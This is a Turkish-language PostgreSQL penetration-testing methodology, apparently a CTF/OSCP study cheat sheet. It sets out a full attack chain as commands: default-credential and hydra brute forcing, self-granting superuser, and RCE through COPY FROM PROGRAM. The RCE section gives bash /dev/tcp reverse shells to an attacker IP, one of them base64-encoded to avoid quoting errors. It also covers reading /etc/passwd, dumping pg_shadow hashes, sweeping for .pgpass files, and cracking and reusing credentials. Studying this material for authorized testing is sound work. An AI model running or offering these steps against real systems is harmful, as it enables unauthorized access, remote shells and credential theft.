# PostgreSQL Pentest Methodology

Sıra: recon/connect → auth → enum → privilege check → RCE/file read-write → creds/lateral. Superuser değilsen bazı adımlar çalışmaz — her adımda decision point var.

---

## 1. Recon & Connection

```bash
nmap -sV -p 5432,5433,5434,5435,5436,5437 -sC <target>
```

**Default port:** 5432 (lab/CTF'lerde custom port sık görülür — nmap ile doğrula).

**Default/weak creds dene:**

```bash
psql -h <target> -p <port> -U postgres          # şifresiz dene
```

|User|Şifre denemeleri|
|---|---|
|postgres|postgres, password, admin, blank, `<hostname>`, `<db_name>`|
|pgsql|pgsql|

**Bruteforce (creds bilinmiyorsa):**

```bash
hydra -l postgres -P /usr/share/wordlists/rockyou.txt <target> -s <port> postgres
```

**Decision point:** Auth bypass yoksa ve creds kırılamıyorsa → dış recon'a dön (source code'da hardcoded connection string, `.pgpass`, config dosyası, env variable ara). Erişim varsa → 2. adıma geç.

---

## 2. Post-Auth Enumeration

```sql
\conninfo
SELECT version();
SELECT current_user, current_database();
SELECT usename, usesuper FROM pg_user;   -- kendi/diğer userların superuser durumu

\list
\du+
```

**`\list`** → erişilebilir DB'leri listeler, sonraki adımlarda hangi DB'ye `\c` yapılacağını belirler. **`\du+`** → tüm rollerin `Superuser`, `Create role`, `Create DB` yetkilerini gösterir — **en kritik enum çıktısı**, sonraki tüm saldırı yolunu bu belirler.

**Decision point (üzerinden ilerle):**

|`\du+` çıktısı|Sonraki adım|
|---|---|
|`Superuser` attribute'u var|→ 3. adım (RCE) direkt çalışır|
|Superuser değil ama `Create role` var|Kendine superuser rolü verebilirsin (aşağıya bak)|
|Sadece bağlı DB üzerinde owner/CREATE yetkisi var|RCE yok, sadece o DB içinde veri okuma/yazma — creds/hassas veri sweep'e odaklan|
|Hiçbir yetki yok, read-only|Sadece veri exfiltration, RCE vektörü kapalı|

**Create role varsa kendine superuser ver:**

```sql
ALTER ROLE <current_user> WITH SUPERUSER;
```

---

## 3. RCE — `COPY ... FROM PROGRAM` (Superuser gerektirir, PostgreSQL 9.3+)

Bu, superuser bağlantısında en direkt RCE yolu. `COPY FROM PROGRAM`, sunucu tarafında shell komutu çalıştırıp çıktısını bir tabloya yazar.

### PoC — Komut Çalıştırma

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

Çıktı `postgres` (servis) kullanıcısı bağlamında döner — genelde düşük yetkili bir sistem kullanıcısıdır, bu yüzden bu tek başına genelde bir **privesc/local shell zinciri** demektir, direkt root değil.

**Decision point:** `id` çıktısı beklenen bir low-priv user mı? Evet → reverse shell alıp local privesc'e geç (sudo -l, SUID, vs. — bkz. Linux privesc metodolojisi). `cmd_exec` çalışmıyor / permission denied dönüyorsa → `usesuper` çıktısını tekrar doğrula, muhtemelen superuser değilsin.

### Reverse Shell — `COPY FROM PROGRAM` ile

**Önce listener'ı aç (payload'dan ÖNCE):**

```bash
sudo nc -lvnp 4444
```

**Yöntem A — tek satır, doğrudan (önerilen):**

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"';
```

> **Kritik nokta:** `sh -i` DEĞİL `bash -i` kullan. Debian/Ubuntu'da `/bin/sh` → `dash` symlink'idir ve `dash`, `/dev/tcp` özelliğini desteklemez; `sh -i` ile denersen komut sessizce fail eder (exit code 1), shell hiç bağlanmaz.

**Yöntem B — script dosyasına yazıp çalıştırma (nested quoting sorun çıkarırsa):**

```sql
COPY cmd_exec FROM PROGRAM 'echo "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" > /tmp/.s.sh';
COPY cmd_exec FROM PROGRAM 'bash /tmp/.s.sh';
```

**Yöntem C — base64 encode (quoting sorunlarını tamamen bypass eder, en güvenilir):**

```bash
# saldırgan makinede
echo -n 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' | base64
```

```sql
COPY cmd_exec FROM PROGRAM 'echo <BASE64_STRING> | base64 -d | bash';
```

|Belirti|Muhtemel sebep → çözüm|
|---|---|
|`COPY ... failed, child process exited with exit code 1`|`sh -i` kullanılmış → `bash -i` ile değiştir|
|Komut hemen dönüyor, shell bağlanmıyor|Listener açık değil / yanlış IP-port → `nc -lvnp` ile önceden aç, `ip a`/tun0 IP'sini doğrula|
|`permission denied`|Superuser değilsin → `\du+` çıktısına dön|
|Quoting/escape hatası (nested `"..."` içinde `'...'`)|Yöntem C (base64) kullan|

**Temizlik (her PoC sonrası):**

```sql
DROP TABLE IF EXISTS cmd_exec;
```

---

## 4. RCE Alternatifleri (superuser, `COPY ... FROM PROGRAM` kapalıysa)

|Teknik|Komut|Not|
|---|---|---|
|Large object export (dosya okuma)|`SELECT lo_import('/etc/passwd', 12345); SELECT lo_export(12345, '/tmp/out');`|Dosya okuma, RCE değil|
|`COPY ... TO/FROM` file|`COPY cmd_exec FROM '/etc/passwd';`|`pg_read_server_files` yetkisi gerekir|
|UDF (C ile derlenmiş) via `lo_export` + `CREATE FUNCTION`|Metasploit `postgres_payload` modülü otomatize eder|Derleyici erişimi ve OS/arch uyumu gerekir, `COPY FROM PROGRAM`'dan daha kırılgan|
|`pg_read_file` / `pg_ls_dir`|`SELECT pg_read_file('/etc/passwd', 0, 1000);`|Sadece dosya okuma (superuser veya `pg_read_server_files` rolü)|

**Decision point:** `COPY FROM PROGRAM` çalışıyorsa yukarıdakilere hiç gerek yok — en direkt ve güvenilir yol o.

---

## 5. Credential / Hassas Veri Toplama

```sql
-- Password hash'leri (superuser gerekir)
SELECT usename, passwd FROM pg_shadow;
SELECT rolname, rolpassword FROM pg_authid;

-- DB içindeki tablolarda hardcoded creds/secret sweep
SELECT table_name, column_name FROM information_schema.columns
WHERE column_name ILIKE ANY(ARRAY['%pass%','%pwd%','%secret%','%token%','%key%']);
```

**Sistem tarafında (RCE elde ettikten sonra):**

```bash
find / -name "pgpass" -o -name ".pgpass" 2>/dev/null
cat /var/lib/postgresql/.pgpass 2>/dev/null
grep -r "password" /etc/postgresql/*/main/pg_hba.conf 2>/dev/null
```

**Decision point:** `pg_shadow`'dan hash aldıysan → `john`/`hashcat` ile kırmayı dene (`postgres` hash formatı MD5-tabanlı, `md5<md5(password+username)>` şeklindedir), kırılan şifreyi diğer servislerde (SSH, web panel) credential reuse için test et.

---

## Öncelik Sırası (Hızlı Yol)

1. **Default/boş creds ile `postgres` superuser bağlan** — en yaygın giriş noktası, özellikle CTF/OSCP kutularında.
2. **`\du+` ile superuser doğrula** — her şey buna bağlı.
3. **Superuser ise direkt `COPY FROM PROGRAM` ile reverse shell** — en hızlı RCE yolu, ek araç/UDF gerektirmez.
4. Reverse shell sonrası **local privesc'e geç** (`postgres` servis kullanıcısı genelde root değildir).
5. Superuser değilsen: **`Create role` yetkisini kontrol et** (kendine superuser ver) veya **credential/dosya sweep**'e düş.

> Rapor için: her adımda hangi enum çıktısının (örn. `\du+`'daki `Superuser` attribute'u) bu tekniği seçmene yol açtığını not al — OSCP raporu bunu bekliyor.